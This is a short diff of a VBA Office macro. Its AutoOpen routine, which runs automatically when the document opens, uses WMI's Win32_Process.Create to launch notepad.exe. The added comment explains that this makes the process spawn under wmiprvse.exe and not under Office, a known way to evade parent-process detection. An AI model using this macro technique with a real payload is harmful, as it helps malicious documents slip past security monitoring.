@@ -1,6 +1,6 @@
 Sub AutoOpen()
 on error resume next
-
+' Using this technique the new process will be spawned under “wmiprvse.exe” instead of the Office process.
 set process = GetObject("winmgmts:Win32_Process")
 
 result = process.Create ("notepad.exe",null,null,processid)
